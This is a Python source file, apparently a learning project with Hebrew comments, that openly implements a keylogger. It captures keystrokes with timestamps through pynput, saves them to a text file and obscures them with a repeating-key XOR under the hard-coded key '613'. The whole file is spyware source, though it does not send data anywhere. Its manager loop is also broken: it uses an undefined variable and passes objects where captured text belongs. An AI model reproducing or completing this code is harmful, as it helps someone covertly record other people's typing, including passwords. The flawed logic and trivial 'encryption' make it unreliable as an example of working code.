
from datetime import datetime
from pynput import keyboard
from collections import defaultdict
import time
import threading


class Key_loger:
    def __init__(self):
        self.press_char = defaultdict(list)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.stop_timer = threading.Timer(60, self.stop_after_one_minute)
        self.stop_timer.start()

    def stop_after_one_minute(self):
        self.listener.stop()
        return self.press_char

    def on_press(self, key):
        """ מאזין להקשות מקשים ושומר אותן לפי זמן """
        try:
            formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
            if hasattr(key, 'char') and key.char is not None:
                self.press_char[formatted_date].append(key.char)
            else:
                self.press_char[formatted_date].append(key.name if hasattr(key, "name") else str(key))
        except Exception as e:
            print(f"שגיאה: {e}")

        
class Writer:
    def __init__(self, data):
        self.data = data
        self.file_name = "key_logger_non_encrypted_file.txt"
        self.write()
 
    def write(self):
        with open(self.file_name, "w") as f:  
            f.write(self.data)





class EncryptorAndDecryptor:
    def __init__(self, data):
        self.data = data
        self.encrypted_file_name = "key_logger_encrypted_file.txt"
        self.decrypted_file_name = "key_logger_non_encrypted_file.txt"
        self.key_word = "613"

    def encrypt(self):
        string = ""
        key_length = len(self.key_word)

        with open(self.decrypted_file_name, "r") as read_file:
            text = read_file.read()  # Read full file content

        # XOR each character with the corresponding key character (cycling through the key)
        for i in range(len(text)):
            string += chr(ord(text[i]) ^ ord(self.key_word[i % key_length]))  #

        with open(self.encrypted_file_name, "w") as f:  # Overwrite to avoid appending errors
            f.write(string)


    def decrypt(self):
        string = ""
        key_length = len(self.key_word)

        with open(self.encrypted_file_name, "r") as read_file:
            encrypted_text = read_file.read()  # Read full encrypted content

        # XOR each character with the corresponding key character (cycling through the key)
        for i in range(len(encrypted_text)):
            string += chr(ord(encrypted_text[i]) ^ ord(self.key_word[i % key_length]))  

        with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
            f.write(string)


class Manager:
    def __init__(self, time_to_run):
       self.time_to_run = time_to_run # must be in minutes...it'll then iterate through this for 60 second intervals!
       self.run_key_logger()
    
    def run_key_logger(self):
        while self.time_to_run != 0:
            kl = Key_loger()
            ec = EncryptorAndDecryptor(kl)
            w = Writer(kl)
            time_to_run -= 1

           